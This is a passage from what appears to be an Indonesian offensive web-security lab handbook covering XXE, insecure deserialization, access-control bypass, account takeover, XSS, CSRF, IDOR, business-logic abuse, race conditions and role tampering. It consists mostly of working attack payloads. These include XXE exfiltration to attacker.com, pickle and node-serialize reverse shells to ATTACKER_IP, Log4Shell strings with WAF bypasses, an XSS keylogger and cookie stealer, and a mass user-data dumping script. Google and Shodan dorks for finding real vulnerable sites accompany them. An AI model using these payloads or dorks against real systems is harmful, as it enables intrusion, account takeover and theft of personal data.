<!-- ❌ Jika response error/ignore → parser mungkin disable entity -->

<!-- ===== STEP 2: Basic file read ===== -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
<!-- ✅ Response: root:x:0:0:root:/root:/bin/bash... → FILE READ! -->
<!-- ❌ Response kosong → file tidak bisa dibaca (binary/permission) -->

<!-- ===== STEP 3: PHP wrapper (base64 untuk file binary/PHP) ===== -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data>&xxe;</data>
<!-- ✅ Response: cm9vdDp4OjA6MDp... (base64 encoded) -->
<!-- Decode: echo "cm9vdDp4OjA6MDp..." | base64 -d -->

<!-- ===== STEP 4: Baca file sensitif ===== -->
<!-- Linux -->
<!ENTITY xxe SYSTEM "file:///etc/shadow">           <!-- Password hashes -->
<!ENTITY xxe SYSTEM "file:///etc/hostname">          <!-- Hostname -->
<!ENTITY xxe SYSTEM "file:///proc/self/environ">     <!-- Environment vars -->
<!ENTITY xxe SYSTEM "file:///var/www/html/.env">     <!-- Laravel .env -->
<!ENTITY xxe SYSTEM "file:///var/www/html/wp-config.php"> <!-- WordPress config -->

<!-- Windows -->
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">

<!-- ===== STEP 5: Blind XXE (Out-of-Band) ===== -->
<!-- Jika response TIDAK menampilkan data entity -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>test</data>

<!-- evil.dtd (host di server attacker): -->
<!-- Membaca file dan kirim ke server attacker via URL -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
<!-- ✅ Data file muncul di access log server attacker -->
<!-- ❌ Jika tidak ada request → OOB blocked / parser strict -->
```

## Analisis Response
| Response | Artinya |
|----------|--------|
| Isi file muncul di response body | XXE file read berhasil! |
| Base64 string panjang | File berhasil dibaca via php://filter |
| Response kosong tapi no error | Entity diproses tapi file kosong/binary |
| `Invalid XML` / parser error | DTD tidak diproses → XXE tidak bisa |
| Request muncul di server attacker | Blind XXE / OOB berhasil |
| `External entity not allowed` | Parser hardened → XXE di-disable |

## Bukti
- Isi `/etc/passwd` muncul di response
- Base64 encoded file content di response
- OOB request dengan data file di log attacker

---

# 9. Insecure Deserialization to RCE Lab

**Kategori**: Software/Data Integrity | **OWASP**: A08  
**Tujuan**: Object berbahaya memicu command execution di lab

## Dork
```
# Google Dork — cari endpoint deserialization
intext:"java.io.ObjectInputStream" | intext:"readObject"
intext:"unserialize(" ext:php
intext:"pickle.loads" ext:py
intext:"Marshal.load" ext:rb
inurl:"/api/" intext:"application/x-java-serialized-object"
intext:"ViewState" ext:aspx  # .NET deserialization
intext:"__VIEWSTATE" site:.gov | site:.edu
intext:"node-serialize" | intext:"serialize-javascript"

# Shodan — Java apps (rentan ysoserial)
"X-Powered-By: Servlet" port:8080,8443
http.html:"JSESSIONID" port:8080
"Apache Tomcat" port:8080
"JBoss" port:8080 | port:9990
"WebLogic" port:7001

# Nuclei
nuclei -u https://target.com -tags deserialization,rce
```

## Cara Kerja
Deserialization adalah proses mengubah data serial (string/bytes) kembali menjadi object. Jika server melakukan `pickle.loads()`, `unserialize()`, atau `ObjectInputStream.readObject()` pada input user tanpa validasi, attacker bisa membuat object yang menjalankan command saat di-deserialize. Ini terjadi karena beberapa class memiliki "magic methods" (`__reduce__`, `__wakeup__`, `readObject`) yang otomatis dipanggil.

## Langkah

```python
# ===== Python pickle RCE =====
import pickle, base64, os

# Method 1: os.system
class Exploit:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
# Kirim payload sebagai cookie/parameter

# Method 2: Reverse shell via pickle
import pickle, base64
class RevShell:
    def __reduce__(self):
        import os
        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"',))
payload = base64.b64encode(pickle.dumps(RevShell())).decode()
print(f"Cookie: session={payload}")

# Method 3: subprocess with output
class ExecCmd:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['id'],))
```

```bash
# ===== Java ysoserial =====
# Generate payloads untuk berbagai library
java -jar ysoserial.jar CommonsCollections1 'touch /tmp/pwned' | base64
java -jar ysoserial.jar CommonsCollections5 'curl http://ATTACKER/$(whoami)' | base64
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,BASE64_REV_SHELL}|{base64,-d}|bash' | base64
java -jar ysoserial.jar Spring1 'id' | base64
java -jar ysoserial.jar Groovy1 'id' | base64

# JNDI Injection (Log4Shell style)
${jndi:ldap://ATTACKER_IP:1389/exploit}
${jndi:rmi://ATTACKER_IP:1099/exploit}
# Bypass WAF:
${${lower:j}ndi:${lower:l}dap://ATTACKER/x}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://ATTACKER/x}

# Kirim ke endpoint yang deserialize Java object
curl -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.bin https://target.com/api/endpoint
```

```bash
# ===== PHP Deserialization =====
# Basic object injection
O:8:"RCEClass":1:{s:3:"cmd";s:2:"id";}

# POP chain (Property Oriented Programming)
O:8:"Gadget1":1:{s:4:"next";O:8:"Gadget2":1:{s:4:"func";s:6:"system";s:3:"arg";s:2:"id";}}

# Phar deserialization (upload .phar disguised as image)
# Generate phar:
php -r '
$p = new Phar("exploit.phar");
$p->startBuffering();
$p->addFromString("test.txt","test");
$p->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$o = new RCEClass();
$o->cmd = "id";
$p->setMetadata($o);
$p->stopBuffering();
'
# Trigger: phar://uploads/exploit.phar/test.txt

# Base64 encode → kirim sebagai cookie
echo 'O:8:"RCEClass":1:{s:3:"cmd";s:2:"id";}' | base64
```

```bash
# ===== Node.js Deserialization =====
# node-serialize
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}

# Reverse shell via node-serialize
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"')}()"}

# .NET BinaryFormatter / Json.NET
# ysoserial.net
ysoserial.exe -g WindowsIdentity -f Json.Net -c "calc.exe" -o raw
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c whoami" -o raw

# Ruby Marshal.load
require 'base64'
payload = Base64.encode64(Marshal.dump(ERBGadget.new('system("id")')))
```

## Analisis Response
| Response | Artinya |
|----------|--------|
| File `/tmp/pwned` terbuat | RCE berhasil via deserialization |
| Output `id` / `whoami` muncul | Command execution confirmed |
| `ClassNotFoundException` (Java) | Gadget class tidak ada → coba chain lain |
| `Unsupported class` | Whitelist aktif → perlu bypass |
| `UnpicklingError` (Python) | Pickle gagal → cek format payload |
| JNDI callback muncul di LDAP server | Log4Shell / JNDI injection berhasil |
| `500 Internal Server Error` | Object diproses tapi gagal → adjust payload |
| Response normal tanpa error | Object mungkin tidak di-deserialize |

## Bukti
- Command `id` atau `touch /tmp/pwned` berhasil dieksekusi
- File `/tmp/pwned` terbuat di container lab
- Reverse shell diterima di listener

---

# 10. Broken Access Control Admin Takeover

**Kategori**: Broken Access Control | **OWASP**: A01  
**Tujuan**: User biasa menjadi admin karena kontrol akses lemah

## Dork
```
# Google Dork — cari admin panel terbuka
inurl:"/admin" | inurl:"/dashboard" | inurl:"/panel"
inurl:"/admin" intitle:"Dashboard" -"login" -"sign in"
inurl:"/admin/users" | inurl:"/admin/settings"
intitle:"Admin Panel" -inurl:"login" ext:php
inurl:"wp-admin" -"wp-login"  # WordPress admin tanpa login
inurl:"/administrator/" -"login"  # Joomla
inurl:"/user/" inurl:"role" | inurl:"admin" ext:json

# Shodan — admin panels terbuka
http.title:"Dashboard" -"login" port:80,443,8080
http.title:"Admin" http.status:200 port:80
http.html:"admin_panel" port:80,443
```

## Cara Kerja
Broken Access Control adalah ketika server tidak memverifikasi apakah user memiliki hak untuk mengakses resource tertentu. Ada banyak teknik: mass assignment, direct object reference, path traversal bypass, method tampering, dan header injection.

## Langkah

```bash
# ===== TEKNIK 1: Mass Assignment =====
# Kirim field 'role' yang seharusnya tidak bisa diubah user
POST /api/profile {"name":"test","role":"admin"}
# ✅ Jika response: {"name":"test","role":"admin"} → role berubah!
# ❌ Jika response: {"name":"test","role":"user"} → field di-filter

POST /api/profile {"name":"test","is_admin":true}
POST /api/profile {"name":"test","group":"administrators"}
POST /api/profile {"name":"test","privilege_level":9999}

# ===== TEKNIK 2: Akses langsung ke admin endpoint =====
# Login sebagai user biasa, coba akses endpoint admin
GET /api/admin/panel
Authorization: Bearer REGULAR_USER_TOKEN
# ✅ Jika response: 200 OK + admin panel HTML → NO ACCESS CHECK!
# ❌ Jika response: 403 Forbidden → ada access control
# ❌ Jika response: 401 Unauthorized → perlu auth (tapi coba teknik lain)

# ===== TEKNIK 3: Path bypass =====
# Server mungkin cek "/admin" tapi tidak variasi lain
GET /admin/..;/admin/dashboard     # Java/Spring path normalization
GET /%61dmin/                       # URL encoding 'a' = %61
GET /Admin/                         # Case sensitivity
GET /admin./                        # Trailing dot
GET /admin%20/                      # Trailing space
GET //admin//                       # Double slash
GET /./admin/./dashboard            # Dot segments
# ✅ Jika salah satu return 200 → path filter terbypass!

# ===== TEKNIK 4: HTTP Method tampering =====
# Beberapa WAF/middleware hanya cek method tertentu
POST /admin/users   # ❌ 403 Forbidden
GET /admin/users    # ✅ 200 OK → method-based bypass!
PUT /admin/users    # ✅ 200 OK?
PATCH /admin/users  # ✅ 200 OK?
OPTIONS /admin/users # Melihat allowed methods

# ===== TEKNIK 5: Header-based bypass =====
# Beberapa reverse proxy menggunakan header untuk routing
GET / HTTP/1.1
X-Original-URL: /admin              # Override path
# ✅ Jika admin panel muncul → reverse proxy bypass!

GET / HTTP/1.1
X-Rewrite-URL: /admin/dashboard

GET /admin HTTP/1.1
X-Forwarded-For: 127.0.0.1          # Pretend from localhost
X-Real-IP: 127.0.0.1
# ✅ Jika server cek IP dan trust header → bypass!

# ===== TEKNIK 6: Parameter-based access =====
GET /admin?admin=true
GET /admin?debug=1
GET /admin?role=admin
```

## Analisis Response
| Response | Artinya |
|----------|--------|
| `200 OK` + admin content | Access control BROKEN → takeover! |
| `403 Forbidden` | Ada access control, coba bypass lain |
| `401 Unauthorized` | Perlu token/session → IDOR? |
| `302 Redirect → /login` | Session check ada, tapi coba direct API |
| `200 OK` tapi content biasa | Path ada tapi content berbeda per role |

## Bukti
- Panel admin terbuka untuk user biasa
- Screenshot admin dashboard yang diakses user regular
- Response menunjukkan role berubah via mass assignment

---

# 11. Account Takeover Chain

**Kategori**: Authentication Failure | **OWASP**: A07  
**Tujuan**: Chain: Enumeration → Reset token lemah → Takeover akun dummy

## Dork
```
# Google Dork — cari form forgot password yang rentan
inurl:"forgot-password" | inurl:"reset-password" | inurl:"forgot.php"
inurl:"password_reset" | inurl:"account/recover"
inurl:"token=" inurl:"reset"  # Token di URL
inurl:"reset" inurl:"?token=" | inurl:"?code="
intitle:"Reset Password" inurl:".php"

# Shodan
http.html:"forgot password" http.html:"email" port:80,443
```

## Cara Kerja
Account Takeover (ATO) adalah serangan multi-step. Pertama, attacker menemukan username valid (enumeration). Lalu, attacker exploit mekanisme password reset yang lemah (token pendek/predictable). Akhirnya, attacker menggunakan token untuk mengambil alih akun. Chain ini mendemonstrasikan bagaimana kelemahan kecil berantai menjadi dampak besar.

## Langkah

```bash
# ===== STEP 1: Username Enumeration =====
# Coba login dengan berbagai username
POST /login {"user":"admin","pass":"xxx"}
# ✅ Response: "Wrong password" → user 'admin' EXISTS!

POST /login {"user":"randomuser","pass":"xxx"}
# ✅ Response: "User not found" → user TIDAK ADA
# → Perbedaan pesan = username enumeration confirmed!

# Automated enumeration
ffuf -u "https://lab.com/login" -X POST \
  -d '{"user":"FUZZ","pass":"xxx"}' \
  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -fr "User not found"
# → Semua username yang TIDAK match "User not found" = valid

# ===== STEP 2: Request password reset =====
POST /forgot-password {"email":"admin@lab.com"}
# ✅ Response: "Reset link sent" → email ada
# ❌ Response: "Email not found" → email salah
# Token dikirim: https://lab.com/reset?token=123456

# ===== STEP 3: Predict/brute force reset token =====
# Jika token pendek (4-6 digit) atau sequential:
ffuf -u "https://lab.com/reset?token=FUZZ" -w numbers.txt -mc 200
# ✅ Jika response 200 → token valid ditemukan!
# ❌ Jika semua 404 → token acak/panjang, tidak bisa brute force

# Jika token = timestamp-based:
# Generate token berdasarkan waktu request
python3 -c "import hashlib,time; print(hashlib.md5(str(int(time.time())).encode()).hexdigest())"

# ===== STEP 4: Reset password =====
POST /reset-password {"token":"123456","new_password":"hacked123"}
# ✅ Response: "Password updated successfully" → PASSWORD CHANGED!
# ❌ Response: "Invalid/expired token" → token salah

# ===== STEP 5: Login dengan password baru =====
POST /login {"user":"admin","pass":"hacked123"}
# ✅ Response: 302 redirect ke /dashboard → ACCOUNT TAKEOVER!
```

## Analisis Response
| Step | Response | Artinya |
|------|----------|--------|
| Login | "Wrong password" vs "User not found" | Pesan berbeda = username enumeration |
| Forgot | "Reset link sent" | Email ada, token dikirim |
| Reset | 200 OK pada brute force token | Token ditemukan! |
| Reset | "Password updated" | Password berhasil diubah |
| Login | 302 → /dashboard | Full account takeover |

## Bukti
- Akun dummy berhasil diambil alih melalui chain lengkap
- Screenshot setiap step dari enumeration → takeover
- Token berhasil di-brute force atau di-predict

---

# 12. XSS to Account Impact Simulation

**Kategori**: XSS | **OWASP**: A03  
**Tujuan**: XSS dipakai untuk melakukan aksi atas nama user dummy

## Dork
```
# Google Dork — cari input yang rentan XSS
inurl:"search" | inurl:"q=" | inurl:"query=" | inurl:"keyword="
inurl:"comment" | inurl:"feedback" | inurl:"review" | inurl:"msg="
inurl:"name=" | inurl:"user=" | inurl:"email=" ext:php
inurl:"redirect=" | inurl:"url=" | inurl:"next="
inurl:"error=" | inurl:"message=" | inurl:"alert="
inurl:".php?" intext:"<script>" | intext:"onerror="

# Shodan
http.html:"<input" http.html:"search" port:80,443
http.html:"comment" http.html:"<textarea" port:80
```

## Cara Kerja
XSS bukan hanya `alert(1)`. Pada level high, XSS digunakan untuk **melakukan aksi** atas nama korban: mengubah email, mencuri session, merekam keystrokes. Ini terjadi karena JavaScript yang di-inject berjalan dalam konteks session korban, sehingga bisa melakukan semua yang bisa dilakukan korban.

## Langkah

```html
<!-- ===== STEP 1: Cari injection point ===== -->
<!-- Test XSS di comment, profile bio, review, dll -->
<script>alert(document.domain)</script>
<!-- ✅ Alert muncul → XSS confirmed, lanjut ke weaponization -->

<!-- ===== STEP 2: Stored XSS yang mengubah email korban ===== -->
<script>
fetch('/api/change-email', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
}).then(r => r.json()).then(d => {
  // ✅ Jika d.success = true → email korban berubah!
  // Attacker bisa request password reset ke email baru
  fetch('https://attacker.com/log?status=email_changed');
});
</script>

<!-- ===== STEP 3: Steal session cookie ===== -->
<script>
new Image().src='https://attacker.com/steal?c='+document.cookie;
// ✅ Cookie muncul di log server attacker
// ❌ Jika kosong → cookie HttpOnly (tidak bisa diakses JS)
</script>

<!-- ===== STEP 4: Keylogger ===== -->
<script>
var keys='';
document.onkeypress=function(e){
  keys+=e.key;
  if(keys.length>10){
    new Image().src='https://attacker.com/log?k='+encodeURIComponent(keys);
    keys='';
  }
}
// ✅ Setiap 10 keystroke dikirim ke attacker
// Termasuk password yang diketik!
</script>

<!-- ===== STEP 5: Ubah password korban ===== -->
<script>
// Ambil CSRF token dulu
fetch('/profile').then(r=>r.text()).then(html=>{
  var token = html.match(/csrf["']\s*value=["']([^"']+)/)[1];
  fetch('/api/change-password', {
    method:'POST',
    headers:{'Content-Type':'application/json','X-CSRF-Token':token},
    body:JSON.stringify({new_password:'pwned123'})
  });
});
// ✅ Password korban berubah tanpa korban tahu!
</script>
```

## Analisis Response
| Aksi XSS | Response yang diharapkan |
|----------|------------------------|
| Change email | `{"success":true}` → email berubah |
| Cookie steal | Cookie muncul di attacker server log |
| Keylogger | Keystrokes muncul di attacker log |
| Change password | `200 OK` → password berubah |
| Kosong di cookie steal | HttpOnly flag aktif (✅ tapi XSS masih bisa aksi lain) |

## Bukti
- Email korban berubah tanpa korban klik apapun
- Cookie/keystrokes dikirim ke attacker server
- Password berhasil diubah via XSS payload

---

# 13. CSRF to Critical Action

**Kategori**: Broken Access Control | **OWASP**: A01  
**Tujuan**: CSRF mengubah email/password akun dummy

## Dork
```
# Google Dork — cari form tanpa CSRF protection
inurl:"change-password" | inurl:"update-profile" | inurl:"settings"
inurl:"transfer" | inurl:"send" | inurl:"payment" ext:php
inurl:"delete" | inurl:"remove" inurl:".php?id="
intext:"<form" -intext:"csrf" -intext:"_token" ext:php

# Shodan
http.html:"<form" http.html:"method=\"POST\"" -"csrf" port:80
```

## Cara Kerja
CSRF (Cross-Site Request Forgery) memaksa browser korban mengirim request ke target website menggunakan session yang sudah login. Attacker membuat halaman HTML yang otomatis mengirim form/request saat korban membukanya. Karena browser otomatis mengirim cookie, server mengira request datang dari korban.

## Langkah

```html
<!-- ===== STEP 1: Identifikasi endpoint target ===== -->
<!-- Cari endpoint yang melakukan aksi penting tanpa CSRF token -->
<!-- Contoh: change password, change email, transfer uang -->
<!-- Cek: apakah ada CSRF token? Apakah SameSite cookie? -->

<!-- ===== STEP 2: Auto-submit form (ubah password) ===== -->
<html><body>
<h1>Loading...</h1>
<form action="https://lab.com/api/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>
</body></html>
<!-- Korban membuka halaman ini → form otomatis terkirim -->
<!-- ✅ Jika password berubah → CSRF berhasil! -->
<!-- ❌ Jika error "CSRF token mismatch" → ada proteksi -->

<!-- ===== STEP 3: AJAX CSRF (jika CORS misconfigured) ===== -->
<script>
fetch('https://lab.com/api/change-email', {
  method: 'POST',
  credentials: 'include',  // Kirim cookie korban
  headers: {'Content-Type': 'application/json'},
  body: '{"email":"attacker@evil.com"}'
}).then(r => r.json()).then(d => {
  // ✅ Jika d.success → email berubah!
  // ❌ Jika CORS error di console → CORS properly configured
  console.log('Result:', d);
});
</script>

<!-- ===== STEP 4: Multi-action CSRF ===== -->
<script>
// Step A: Ubah email ke email attacker
fetch('https://lab.com/api/change-email', {
  method:'POST', credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:'{"email":"attacker@evil.com"}'
}).then(() => {
  // Step B: Request password reset ke email baru
  fetch('https://lab.com/api/forgot-password', {
    method:'POST', credentials:'include',
    headers:{'Content-Type':'application/json'},
    body:'{"email":"attacker@evil.com"}'
  });
  // ✅ Password reset link dikirim ke email attacker!
});
</script>
```

## Analisis Response
| Response | Artinya |
|----------|--------|
| Password/email berubah | CSRF berhasil! Tidak ada proteksi |
| `CSRF token mismatch` | CSRF protection aktif → coba XSS untuk bypass |
| `CORS error` di browser console | CORS configured properly |
| `SameSite cookie` warning | Browser block cookie → CSRF tidak bisa |
| `302 Redirect` setelah form submit | Aksi berhasil dilakukan |

## Bukti
- Password/email akun dummy berubah saat korban buka halaman attacker
- Screenshot perubahan data akun
- Request di Burp menunjukkan no CSRF token required

---

# 14. IDOR to Mass Data Exposure

**Kategori**: Broken Access Control | **OWASP**: A01  
**Tujuan**: Enumerasi banyak ID object untuk mass data extraction

## Dork
```
# Google Dork — cari API endpoint dengan ID sequential
inurl:"/api/users/" | inurl:"/api/user/" | inurl:"/api/v1/users"
inurl:"/api/" inurl:"id=" | inurl:"user_id="
inurl:"/profile/" | inurl:"/account/" inurl:"?id="
inurl:"/api/" intext:"email" intext:"phone" ext:json
inurl:"/api/" filetype:json intext:"password" | intext:"hash"

# Shodan — API endpoints
http.html:"swagger" | http.html:"api-docs" port:80,443
http.title:"Swagger UI" port:80,443,8080
```

## Cara Kerja
IDOR (Insecure Direct Object Reference) terjadi ketika server menggunakan ID yang bisa ditebak (1, 2, 3...) tanpa cek apakah user berhak mengakses object tersebut. Attacker mengiterasi ID untuk mengakses data semua user. Pada scale besar, ini = **data breach**.

## Langkah

```bash
# ===== STEP 1: Identifikasi IDOR =====
# Akses profil sendiri
GET /api/users/1001/profile
# ✅ Response: {"id":1001,"name":"John","email":"john@test.com"}

# Coba akses user lain
GET /api/users/1002/profile
# ✅ Jika response: data user lain terlihat → IDOR CONFIRMED!
# ❌ Jika response: 403 Forbidden → ada access control

# ===== STEP 2: Manual sampling =====
GET /api/users/1/profile      # Admin biasanya ID 1
GET /api/users/2/profile
GET /api/users/100/profile
# Cek apakah ada data sensitif: email, phone, address, SSN

# ===== STEP 3: Mass enumeration dengan ffuf =====
ffuf -u "https://lab.com/api/users/FUZZ/profile" \
  -w <(seq 1 10000) -mc 200 -o results.json
# ✅ Jika banyak 200 OK → mass data exposure!
# Output: ribuan profil user

# ===== STEP 4: Script Python (lebih detail) =====
import requests, json
results = []
for i in range(1, 10001):
    r = requests.get(f'https://lab.com/api/users/{i}/profile',
                     headers={'Authorization': 'Bearer TOKEN'})
    if r.status_code == 200:
        data = r.json()
        results.append(data)
        print(f"User {i}: {data.get('email')} | {data.get('name')}")
    # Rate limiting: tambah sleep jika perlu

with open('leaked_users.json', 'w') as f:
    json.dump(results, f)
print(f"Total users leaked: {len(results)}")

# ===== STEP 5: Cek data sensitif yang bocor =====
# Biasanya: email, phone, address, role, created_at
# Worst case: password_hash, SSN, credit card
```

## Analisis Response
| Response | Artinya |
|----------|--------|
| `200 OK` + data user lain | IDOR confirmed! |
| `200 OK` tapi data sendiri | Server ignore ID, pakai session |
| `403 Forbidden` | Access control ada → coba UUID/GUID |
| `404 Not Found` | ID tidak ada, coba range lain |
| `429 Too Many Requests` | Rate limiting → perlambat request |

## Bukti
- Data ratusan/ribuan user dummy terekspos
- Screenshot hasil enumerasi massal
- File JSON berisi semua data yang di-dump

---

# 15. Business Logic Abuse

**Kategori**: Business Logic | **OWASP**: A04  
**Tujuan**: Manipulasi transaksi/diskon/poin yang tidak seharusnya

## Dork
```
# Google Dork — cari e-commerce/payment form
inurl:"checkout" | inurl:"cart" | inurl:"payment" ext:php
inurl:"coupon" | inurl:"voucher" | inurl:"promo" | inurl:"discount"
inurl:"redeem" | inurl:"reward" | inurl:"points"
inurl:"transfer" | inurl:"topup" | inurl:"wallet"
inurl:"price=" | inurl:"amount=" | inurl:"qty="

# Shodan
http.html:"add to cart" http.html:"checkout" port:80,443
http.title:"Shop" | http.title:"Store" port:80,443
```

## Cara Kerja
Business logic flaws terjadi ketika developer tidak memvalidasi nilai input dalam konteks bisnis. Server mungkin memvalidasi tipe data (integer) tapi tidak memvalidasi apakah nilai masuk akal (quantity negatif? harga 0? diskon 200%?). Attacker memanfaatkan ini untuk memanipulasi transaksi.

## Langkah

```bash
# ===== STEP 1: Test negative values =====
POST /api/checkout {"product_id":1,"quantity":-5,"price":100}
# ✅ Jika response: {"total":-500} → saldo bertambah!
# ❌ Jika response: "Invalid quantity" → validasi ada

# ===== STEP 2: Test diskon berlebihan =====
POST /api/apply-coupon {"code":"DISC50","custom_discount":150}
# ✅ Jika total menjadi negatif → logic flaw!

# ===== STEP 3: Test manipulasi poin/saldo =====
POST /api/redeem {"points":99999999}
# ✅ Jika berhasil redeem lebih dari saldo → no validation

# ===== STEP 4: Currency confusion =====
POST /api/checkout {"product_id":1,"price":100,"currency":"IDR"}
# Padahal harga asli dalam USD → bayar 100 IDR bukan 100 USD
# ✅ Jika transaksi berhasil dengan harga salah → logic flaw!

# ===== STEP 5: Race condition + voucher abuse =====
# (lihat #16 Race Condition)
```

## Analisis Response
| Response | Artinya |
|----------|--------|
| Total negatif | Quantity negatif tidak divalidasi |
| Saldo bertambah | Reverse transaction → critical logic flaw |
| `200 OK` dengan harga 0 | Server menerima harga manipulasi |
| `Invalid value` / `Validation error` | Server memvalidasi → aman |

## Bukti
- Harga/total menjadi negatif atau nol
- Poin/saldo tidak valid diterima sistem
- Screenshot transaksi berhasil dengan nilai anomali

---

# 16. Race Condition Lab

**Kategori**: Business Logic | **OWASP**: A04  
**Tujuan**: Mengirim request paralel untuk menggandakan efek

## Dork
```
# Google Dork — cari fitur rentan race condition
inurl:"redeem" | inurl:"claim" | inurl:"voucher" ext:php
inurl:"transfer" | inurl:"withdraw" | inurl:"send-money"
inurl:"apply-coupon" | inurl:"use-code" | inurl:"activate"
inurl:"vote" | inurl:"like" | inurl:"follow" ext:php

# Shodan
http.html:"redeem" http.html:"voucher" port:80,443
```

## Cara Kerja
Race condition terjadi ketika server memproses beberapa request secara paralel tanpa locking/mutex. Contoh: voucher "1x pakai" dicek belum terpakai oleh 50 request bersamaan, sehingga SEMUA lolos pengecekan dan voucher terpakai 50 kali. Ini disebut TOCTOU (Time-of-Check to Time-of-Use).

## Langkah

```bash
# ===== STEP 1: Identifikasi target race condition =====
# Fitur yang rentan: redeem voucher, transfer uang, update saldo
# Syarat: operasi "check then act" tanpa locking

# ===== STEP 2: Python threading (50 request paralel) =====
import threading, requests

success_count = 0
def redeem():
    global success_count
    r = requests.post('https://lab.com/api/redeem-voucher',
        json={"code":"VOUCHER50"},
        headers={"Authorization":"Bearer TOKEN"})
    if r.status_code == 200 and 'success' in r.text:
        success_count += 1
    print(f"Status: {r.status_code} | {r.text[:50]}")

threads = [threading.Thread(target=redeem) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
print(f"\n✅ Voucher redeemed {success_count}x (should be 1x)")
# ✅ Jika success_count > 1 → RACE CONDITION!

# ===== STEP 3: Burp Turbo Intruder =====
# Send to Turbo Intruder → use race.py template

# ===== STEP 4: curl parallel =====
seq 1 50 | xargs -P50 -I{} curl -s -X POST \
  https://lab.com/api/redeem-voucher \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code":"VOUCHER50"}'
# Hitung berapa yang return "success"
```

## Analisis Response
| Response | Artinya |
|----------|--------|
| Multiple `200 OK` + "success" | Race condition! Voucher terpakai >1x |
| 1x `200 OK`, sisanya `400` | Server ada locking → aman |
| `429 Too Many Requests` | Rate limiting aktif |
| Saldo bertambah >1x | Double spending confirmed |

## Bukti
- Voucher terpakai 2x atau lebih (saldo bertambah ganda)
- Order/transaksi terduplikasi
- Log menunjukkan multiple redemption

---

# 17. Privilege Escalation via Role Tampering

**Kategori**: Broken Access Control | **OWASP**: A01  
**Tujuan**: Mengubah role lewat request/API

## Dork
```
# Google Dork — cari API update profile/role
inurl:"/api/" inurl:"profile" | inurl:"update" | inurl:"user"
inurl:"/api/" inurl:"role" | inurl:"permission" | inurl:"admin"
inurl:"update-profile" | inurl:"edit-user" | inurl:"settings"
intext:"role" intext:"admin" inurl:"/api/" ext:json

# Shodan
http.html:"JWT" | http.html:"Bearer" port:80,443
http.html:"role" http.html:"admin" port:80,443,8080
```

## Cara Kerja
Privilege escalation terjadi ketika user bisa mengubah role/permission-nya sendiri. Ini bisa via **mass assignment** (mengirim field `role` di update profile), **JWT tampering** (mengubah claim `role` di token), atau **cookie manipulation** (mengubah cookie `role=admin`). Server yang tidak memvalidasi field yang boleh diubah rentan terhadap ini.

## Langkah

```bash
# ===== TEKNIK 1: Mass Assignment =====
# Intercept update profile → tambah role field
POST /api/update-profile
{"name":"test","role":"admin"}
# ✅ Jika response: {"role":"admin"} → role berubah!

POST /api/update-profile
{"name":"test","is_admin":true}
{"name":"test","group":"administrators"}
{"name":"test","privilege_level":9999}
# Coba berbagai field name yang mungkin

# ===== TEKNIK 2: JWT claim tampering =====
# Jika secret diketahui (dari #16 di medium)
# Decode → ubah role → re-sign
python3 -c "
import jwt
token = jwt.encode({'sub':'user1','role':'admin'}, 'weak_secret', algorithm='HS256')
print(token)
"
# Gunakan token baru ini di header Authorization

# ===== TEKNIK 3: Cookie manipulation =====
# Di browser DevTools: Application → Cookies
# Ubah:
Cookie: role=user → role=admin
Cookie: user_type=regular → user_type=superadmin
# ✅ Jika admin panel muncul → cookie-based role!

# ===== TEKNIK 4: API endpoint manipulation =====
PUT /api/users/1001 {"role":"moderator"}
PATCH /api/users/1001 {"permissions":["read","write","admin"]}
# ✅ Jika response 200 → role berubah!
# ❌ Jika 403 → endpoint dilindungi
```

## Analisis Response
| Response | Artinya |
|----------|--------|
| `200 OK` + role berubah di response | Privilege escalation berhasil! |
| Admin panel accessible | Elevated access confirmed |
| `200 OK` tapi role tidak berubah | Field di-whitelist (aman) |
| `403 Forbidden` | Endpoint dilindungi |
| JWT accepted dengan role admin | JWT tampering berhasil |

## Bukti
- User biasa berhasil menjadi admin/moderator
- Panel admin bisa diakses setelah role change
- Screenshot before/after role change

---

# 18. Supply Chain Vulnerable Component Lab

**Kategori**: Vulnerable Components | **OWASP**: A06  
**Tujuan**: Mengidentifikasi dependency rentan dalam lab

## Dork
```
# Google Dork — cari versi software lama/rentan
"Apache/2.4.49" | "Apache/2.4.50"  # CVE-2021-41773
"X-Powered-By: PHP/5" | "X-Powered-By: PHP/7.0" | "X-Powered-By: PHP/7.1"
intitle:"Apache2 Ubuntu Default Page" | intitle:"Apache2 Debian Default Page"
"Server: nginx/1.14" | "Server: nginx/1.16"  # Old nginx
"jQuery v1." | "jQuery v2."  # Old jQuery
"X-Powered-By: Express" intext:"Cannot GET"  # Express.js default error
